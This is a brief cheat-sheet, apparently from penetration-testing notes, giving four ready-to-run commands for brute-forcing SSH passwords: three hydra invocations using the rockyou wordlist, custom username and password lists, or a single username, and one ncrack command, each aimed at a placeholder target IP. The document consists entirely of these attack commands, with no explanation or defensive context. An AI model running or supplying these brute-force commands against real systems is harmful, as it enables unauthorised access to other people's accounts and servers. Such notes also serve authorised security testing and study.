
Using rockyou wordlist:
---
```shell
hydra -l USERNAME -P /usr/share/wordlists/rockyou.txt $TARGET_IP ssh -t 4 -V
```

Using custom wordlist:
---
```shell
hydra -L usernames -P passwords $TARGET_IP ssh -t 4 -V
```

Brute force single username:
---
```shell
hydra -l USERNAME -P passwords $TARGET_IP ssh -t 4 -V
```

Using ncrack:
---
```shell
ncrack -u $TARGET_USER -P wordlist -v ssh://$TARGET_IP
```